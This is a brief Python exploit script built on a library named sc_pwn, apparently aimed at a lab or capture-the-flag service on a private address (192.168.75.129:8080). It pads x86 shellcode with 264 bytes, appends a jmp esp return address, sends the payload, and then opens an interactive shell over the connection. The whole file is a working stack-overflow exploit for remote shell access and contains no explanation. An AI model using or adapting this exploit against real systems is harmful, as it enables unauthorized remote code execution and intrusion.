#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",8080)

addr_jmp_esp = 0x080c6b1f

#==========
def attack(nc):
    nc.read_all()
    
    sc = ShellCode('x86',417)
    sc.padding(264)
    sc.sh()
    sc.padding()

    exploit  = sc.get()
    exploit += pack_32(addr_jmp_esp)

    proc('Sending exploit...')
    nc.send(exploit)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
